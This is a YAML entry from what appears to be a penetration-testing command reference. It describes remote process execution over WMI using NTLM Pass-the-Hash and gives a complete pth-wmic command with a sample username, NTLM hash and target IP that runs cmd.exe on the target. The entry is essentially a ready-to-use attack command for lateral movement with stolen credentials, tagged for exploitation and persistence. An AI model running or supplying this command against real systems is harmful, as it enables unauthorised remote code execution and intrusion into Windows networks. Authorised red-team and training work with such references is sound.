---
description: Execute processes remotely over WMI using wmic with NTLM Pass-the-Hash.

Command Reference:
    Target IP: 10.10.10.1
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  pth-wmic -U john%00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396 --namespace //root/cimv2 --node 10.10.10.1 process call create "cmd.exe /c whoami"

items:
  - Hash

services:
  - WMI
  - NTLM

OS:
  - Windows

attack_types:
  - Exploitation
  - Persistence

references:
  - https://github.com/byt3bl33d3r/pth-toolkit
  - https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page
---
